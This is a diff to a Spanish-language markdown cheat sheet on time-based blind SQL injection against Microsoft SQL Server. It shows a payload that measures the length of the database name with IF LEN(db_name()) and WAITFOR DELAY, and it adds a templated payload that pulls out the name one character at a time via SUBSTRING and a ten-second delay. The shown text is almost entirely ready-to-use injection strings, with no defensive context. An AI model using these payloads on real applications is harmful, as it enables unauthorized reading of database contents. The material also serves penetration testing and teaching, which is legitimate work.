@@ -15,3 +15,7 @@ Aplicamos lógica de tiempo en SQL para ver si se inyecta y es validada analizan
 ### Extraer el length del nombre de una db
 
     <dato>'; IF (LEN(db_name()))=<num> WAITFOR DELAY '0:0:10'-- 
+
+### Extraer el nombre de una DB
+
+    <dato>'; IF (select substring(db_name(),<index>,1))='<letra>' WAITFOR DELAY '0:0:10'-- 
